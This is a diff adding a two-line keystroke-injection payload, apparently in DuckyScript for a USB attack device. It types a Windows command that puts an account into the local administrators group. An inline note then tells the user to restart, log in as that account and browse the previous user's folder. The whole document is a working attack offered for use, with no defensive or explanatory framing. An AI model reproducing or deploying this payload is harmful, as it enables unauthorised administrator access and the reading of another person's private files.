@@ -1,0 +1,2 @@
+﻿DELAY 300
+STRING net localgroup administrators newacountname /add      RESTART THE PC, SELECT THE NEW USER, LOG IN, GO TO: This PC , THEN: Users , Then: select the previous acounts folder
